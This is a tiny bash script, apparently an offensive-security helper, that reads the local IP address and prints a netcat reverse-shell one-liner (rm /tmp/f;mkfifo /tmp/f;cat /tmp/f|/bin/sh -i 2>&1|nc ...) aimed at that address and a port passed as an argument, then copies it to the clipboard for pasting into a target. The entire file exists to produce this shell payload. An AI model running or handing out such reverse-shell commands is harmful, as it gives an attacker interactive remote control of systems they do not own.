#!/bin/bash
IP=$( hostname -I );
New_IP=$( echo -n $IP );
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $New_IP $1 >/tmp/f";
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $New_IP $1 >/tmp/f" | clip;
